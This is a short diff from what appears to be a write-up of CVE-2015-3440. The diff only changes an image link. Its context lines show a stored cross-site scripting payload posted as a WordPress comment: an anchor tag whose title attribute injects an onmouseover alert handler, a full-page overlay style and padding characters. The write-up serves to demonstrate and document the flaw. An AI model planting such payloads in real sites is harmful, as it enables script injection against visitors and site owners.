@@ -18,4 +18,4 @@ The comment with the script is as follows -
 <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAA64kbAA
 '></a>
 I entered the script into the comment and got this -
-![CVE2015-3440](/)
+![CVE2015-3440](/wordpressbroke.JPG)
